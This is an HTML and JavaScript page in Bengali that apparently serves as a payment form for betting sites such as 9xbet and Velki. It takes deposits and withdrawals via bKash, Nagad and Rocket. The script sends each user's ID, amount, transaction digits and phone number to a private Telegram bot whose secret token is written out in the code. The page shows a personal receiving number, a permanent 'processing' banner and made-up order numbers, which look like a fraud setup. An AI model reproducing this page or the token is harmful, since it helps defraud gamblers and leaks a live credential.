<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">

<style>
*{box-sizing:border-box;}

html,body{
  height:100%;
  overflow-x:hidden;
}

body{
  margin:0;
  font-family:'Poppins',sans-serif;
  background:linear-gradient(180deg,#020617,#031b34);
  color:white;
  display:flex;
  justify-content:center;
}

.container{
  width:100%;
  max-width:380px;
  padding:15px;
  padding-top:25px;
  padding-bottom:120px;
}

/* TOP NOTE */
.top-note{
  overflow:hidden;
  background: rgba(14,165,233,0.15);
  border-radius:12px;
  margin-bottom:8px;
}
.top-note span{
  display:inline-block;
  padding:10px;
  white-space:nowrap;
  animation:slide 10s linear infinite;
}

@keyframes slide{
  0%{transform:translateX(100%);}
  100%{transform:translateX(-100%);}
}

/* TABS */
.tabs{
  display:flex;
  margin-bottom:8px;
  background:#020617;
  border-radius:20px;
  padding:4px;
}
.tab{
  flex:1;
  padding:12px;
  text-align:center;
  border-radius:20px;
  cursor:pointer;
  color:#94a3b8;
}
.tab.active{
  background:linear-gradient(45deg,#0ea5e9,#2563eb);
  color:white;
}

/* CARD */
.card{
  background:rgba(2,6,23,0.9);
  padding:18px;
  border-radius:22px;
  margin-top:6px;
}

/* METHODS */
.methods{
  display:flex;
  gap:8px;
  margin-bottom:12px;
}
.method{
  flex:1;
  padding:10px;
  text-align:center;
  background:#0f172a;
  border-radius:14px;
  cursor:pointer;
}
.method.active{border:1px solid #0ea5e9;}

.number-card{
  display:none;
  margin-top:10px;
  margin-bottom:10px;
  padding:15px;
  border-radius:18px;
  background:#020617;
  border:1px dashed #0ea5e9;
  text-align:center;
}

/* INPUT */
.row{
  display:flex;
  gap:8px;
}
.row input{
  flex:1;
  min-width:0;
  padding:12px;
  border:none;
  border-radius:14px;
  background:#020617;
  color:white;
}

.btn{
  width:100%;
  padding:14px;
  margin-top:15px;
  background:linear-gradient(45deg,#0ea5e9,#2563eb);
  border:none;
  border-radius:16px;
  color:white;
  font-weight:600;
}

/* FLOAT AREA */
.float-area{
  position:fixed;
  bottom:110px;
  left:50%;
  transform:translateX(-50%);
  width:calc(100% - 30px);
  max-width:380px;
  display:flex;
  justify-content:space-between;
  align-items:flex-end;
  z-index:999;
}

/* SAME AS TOP ANIMATION */
.left-btn{
  overflow:hidden;
  background: rgba(14,165,233,0.15);
  border-radius:12px;
  width:160px;
}
.left-btn span{
  display:inline-block;
  padding:10px;
  white-space:nowrap;
  animation:slide 10s linear infinite;
}

/* WHATSAPP */
.whatsapp{
  width:60px;
  height:60px;
  border-radius:50%;
  background:#25D366;
  display:flex;
  justify-content:center;
  align-items:center;
}

/* LOADER */
.loader{
  display:none;
  text-align:center;
  margin-top:10px;
}
</style>
</head>

<body>

<div class="container">

<div class="top-note">
  <span>⏳ অনুগ্রহ করে অপেক্ষা করুন, আপনার ডিপোজিট প্রক্রিয়াধীন...</span>
</div>

<div class="tabs">
  <div class="tab active" onclick="showTab('deposit', event)">Deposit</div>
  <div class="tab" onclick="showTab('withdraw', event)">Withdraw</div>
</div>

<!-- Deposit -->
<div id="deposit" class="card">

  <div class="methods">
    <div class="method active" onclick="selectMethod(this)">বিকাশ</div>
    <div class="method" onclick="selectMethod(this)">নগদ</div>
    <div class="method" onclick="selectMethod(this)">রকেট</div>
  </div>

  <div class="number-card" id="numberCard"></div>

  <div class="row">
    <input type="text" id="d_userid" placeholder="ইউজার ID">
    <input type="number" id="d_amount" placeholder="টাকার পরিমাণ">
    <input type="text" id="d_last" placeholder="লাস্টের চারটি সংখ্যা">
  </div>

  <button class="btn" onclick="sendDeposit()">সাবমিট</button>
  <div class="loader" id="loader">⏳ Processing...</div>
</div>

<!-- Withdraw -->
<div id="withdraw" class="card" style="display:none;">

  <div class="methods">
    <div class="method active">বিকাশ</div>
    <div class="method">নগদ</div>
    <div class="method">রকেট</div>
  </div>

  <div class="row">
    <input type="text" id="w_userid" placeholder="ইউজার ID">
    <input type="number" id="w_amount" placeholder="টাকার পরিমাণ">
    <input type="text" id="w_number" placeholder="নাম্বার">
  </div>

  <button class="btn" onclick="sendWithdraw()">সাবমিট</button>
  <div class="loader" id="loader2">⏳ Processing...</div>
</div>

</div>

<!-- FLOAT -->
<div class="float-area">
  <div class="left-btn">
    <span>বাজিওয়াল 9xbet ভেল্কি সকল সাইডের লিংক সমূহ •</span>
  </div>

  <a href="https://wa.me/+855969610245" target="_blank">
    <div class="whatsapp">
      <img src="https://cdn-icons-png.flaticon.com/512/733/733585.png" width="30">
    </div>
  </a>
</div>

<script>
const botToken = "8216213984:AAFCOQsGouXgnit2vKR6Rv8-VonSYL7_irk";
const chatId = "8406979793";

let orderCounter = 23;

function generateOrderId(){
  return "#" + (orderCounter++);
}

function sendDeposit(){
  document.getElementById("loader").style.display="block";

  setTimeout(()=>{
    let orderId = generateOrderId();

    let msg = `📥 Deposit Request
🆔 Order ID: ${orderId}
🆔 User ID: ${d_userid.value}
💰 Amount: ${d_amount.value}
🔢 Last 4 Digit: ${d_last.value}
📅 ${new Date().toLocaleString()}`;

    sendToTelegram(msg);
    alert("Order ID: " + orderId);

    document.getElementById("loader").style.display="none";
  },1500);
}

function sendWithdraw(){
  document.getElementById("loader2").style.display="block";

  setTimeout(()=>{
    let orderId = generateOrderId();

    let msg = `📤 Withdraw Request
🆔 Order ID: ${orderId}
🆔 User ID: ${w_userid.value}
💰 Amount: ${w_amount.value}
📱 Number: ${w_number.value}
📅 ${new Date().toLocaleString()}`;

    sendToTelegram(msg);
    alert("Order ID: " + orderId);

    document.getElementById("loader2").style.display="none";
  },1500);
}

function sendToTelegram(message){
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      chat_id:chatId,
      text:message
    })
  })
  .then(res=>res.json())
  .then(data=>console.log(data))
  .catch(err=>console.log(err));
}

function selectMethod(el){
  document.querySelectorAll('.method').forEach(m=>m.classList.remove('active'));
  el.classList.add('active');

  document.getElementById('numberCard').innerHTML =
    el.innerText + " নাম্বার<br><b>01316616956</b>";

  document.getElementById('numberCard').style.display='block';
}

function showTab(tab,e){
  document.getElementById('deposit').style.display='none';
  document.getElementById('withdraw').style.display='none';
  document.getElementById(tab).style.display='block';

  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
  e.target.classList.add('active');
}
</script>

</body>
</html>
